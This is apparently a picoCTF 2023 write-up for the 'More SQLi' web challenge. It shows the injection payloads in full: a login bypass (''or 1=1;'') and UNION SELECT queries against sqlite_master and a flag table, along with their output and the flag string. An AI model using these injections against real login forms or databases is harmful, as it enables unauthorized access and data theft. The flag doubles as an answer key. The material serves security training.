# More SQLi

# Description
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.
# Solution
This challenge is so similar to  [the previous one ](irishNameRepo.md) where I use SQL injection but with the difference that It verifies the password first instead of the username 
-  Using the next credentials I log in but there's no flag yet.  
``` sql 
/*
username: admin
password: 'or 1=1;
*/
```

- Instead of getting the flag I'm on the welcome page where's there's no flag apparently. 
- In the welcome page we got a list cities, phones and addresses but there's one record that says "maybe all tables"
- Using the search bar I tried a new SQL injection but this time with ```union select```  looking for the database structure.
```sqlite
/*
sql query:
' union select sql,2,3 FROM sqlite_master;
output:
*/

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)	2	3
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)	2	3
CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)	2	3
CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)	2	3
```

- Inspecting the structure there's a table called "more_table"  that has the field flag so the next step is looking into that specific table for this porpoise I use the next query. 

```sql
/*
sql query:
' union select id,flag,3 FROM more_table;
output:
*/

|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}|3|
|2|If you are here, you must have seen it|3|
```
# References
- [picoCTF 2023 writeup 63 - Web Explotation - More SQLi](https://youtu.be/clMe4yqL6yU?si=NHlXakrUBNkpvnhN)
- [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)